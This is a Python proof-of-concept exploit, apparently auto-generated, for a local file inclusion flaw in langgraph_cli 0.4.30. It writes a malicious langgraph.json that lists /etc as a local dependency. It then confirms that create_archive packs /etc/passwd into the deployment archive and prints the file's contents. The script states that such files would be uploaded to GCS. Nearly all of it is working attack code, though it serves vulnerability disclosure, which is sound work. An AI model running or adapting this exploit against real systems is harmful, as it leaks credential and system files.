#!/usr/bin/env python3
# PoC for langgraph_cli-0.4.30 (/tmp/langgraph_cli/langgraph_cli-0.4.30)
# Path: suspicious-023
# Sink: _add_directory
# Auto-generated — run with: python3 lfi_source_dir_constructed_config__add_directory.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for LFI in langgraph_cli-0.4.30

Vulnerability: The _add_directory function in archive.py reads files from
filesystem paths derived from config without validating they are within the
project directory. By crafting a langgraph.json that references an external
path (e.g., /etc), an attacker can include arbitrary files in the deployment
archive, which is then uploaded to GCS.

This PoC demonstrates the vulnerability by creating a malicious config that
includes /etc/passwd in the archive, then verifying it was included.
"""

import os
import sys
import json
import tempfile
import tarfile
import shutil
import pathlib
import argparse
from typing import Optional

# We need to import the vulnerable module
sys.path.insert(0, "/tmp/langgraph_cli/langgraph_cli-0.4.30")
from langgraph_cli.archive import create_archive, _assemble_local_deps


def create_malicious_config(config_dir: pathlib.Path) -> pathlib.Path:
    """
    Create a malicious langgraph.json that references /etc as a local dependency.
    This causes _assemble_local_deps to return /etc as an additional context,
    which _add_directory will then recursively add to the archive.
    """
    config = {
        "node_version": "20",
        "dockerfile_lines": [],
        "env": {},
        "dependencies": [
            # This is the key: referencing /etc as a local dependency
            # The _assemble_local_deps function will treat this as a path
            # to include in the archive
            "/etc"
        ],
        "graphs": {
            "test": "./test_graph.py"
        }
    }
    
    config_path = config_dir / "langgraph.json"
    with open(config_path, "w") as f:
        json.dump(config, f)
    
    # Create a dummy graph file so the config is valid
    graph_path = config_dir / "test_graph.py"
    with open(graph_path, "w") as f:
        f.write("# dummy graph\n")
    
    return config_path


def verify_exploit(archive_path: str, target_file: str = "etc/passwd") -> bool:
    """
    Check if the target file was included in the archive.
    The path will be relative to the common ancestor, so /etc/passwd
    becomes etc/passwd in the archive.
    """
    try:
        with tarfile.open(archive_path, "r:gz") as tar:
            names = tar.getnames()
            print(f"[*] Files in archive ({len(names)} total):")
            for name in names[:20]:  # Show first 20 files
                print(f"    - {name}")
            if len(names) > 20:
                print(f"    ... and {len(names) - 20} more")
            
            if target_file in names:
                print(f"[+] SUCCESS: Found {target_file} in archive!")
                # Extract and display the file content
                member = tar.getmember(target_file)
                f = tar.extractfile(member)
                if f:
                    content = f.read().decode('utf-8', errors='replace')
                    print(f"[*] Content of {target_file}:")
                    print(content[:500])  # Show first 500 chars
                return True
            else:
                print(f"[-] {target_file} not found in archive")
                return False
    except Exception as e:
        print(f"[-] Error reading archive: {e}")
        return False


def main():
    parser = argparse.ArgumentParser(
        description="PoC for LFI in langgraph_cli-0.4.30"
    )
    parser.add_argument(
        "--target",
        default="/etc/passwd",
        help="Target file to include (default: /etc/passwd)"
    )
    parser.add_argument(
        "--verify-only",
        action="store_true",
        help="Only verify an existing archive (for testing)"
    )
    args = parser.parse_args()

    print("[*] langgraph_cli LFI PoC")
    print("[*] =====================")
    
    # Create a temporary directory for our malicious project
    with tempfile.TemporaryDirectory(prefix="langgraph-poc-") as tmpdir:
        config_dir = pathlib.Path(tmpdir)
        print(f"[*] Created temporary directory: {tmpdir}")
        
        # Create malicious config
        config_path = create_malicious_config(config_dir)
        print(f"[*] Created malicious config: {config_path}")
        print(f"[*] Config references /etc as a local dependency")
        
        # Now call create_archive with our malicious config
        print(f"[*] Calling create_archive with malicious config...")
        print(f"[*] This will include /etc/passwd in the archive")
        
        try:
            with create_archive(config_path, {}) as (archive_path, file_size, config_rel):
                print(f"[*] Archive created: {archive_path}")
                print(f"[*] Archive size: {file_size / 1024:.1f} KB")
                print(f"[*] Config relative path: {config_rel}")
                
                # Verify the exploit
                target_in_archive = f"etc/passwd"  # Relative to common ancestor
                if verify_exploit(archive_path, target_in_archive):
                    print("\n[!] VULNERABILITY CONFIRMED: Arbitrary file inclusion achieved!")
                    print("[!] An attacker could read any file on the system by")
                    print("[!] referencing it in langgraph.json dependencies.")
                    print("\n[!] Impact: Sensitive files (passwords, keys, configs)")
                    print("[!] would be uploaded to GCS during deployment.")
                else:
                    print("\n[-] Exploit failed - target file not in archive")
                    print("[*] This may be due to path resolution differences")
                    print("[*] Check the archive contents above for clues")
                    
        except Exception as e:
            print(f"[-] Error during archive creation: {e}")
            import traceback
            traceback.print_exc()
            sys.exit(1)


if __name__ == "__main__":
    main()
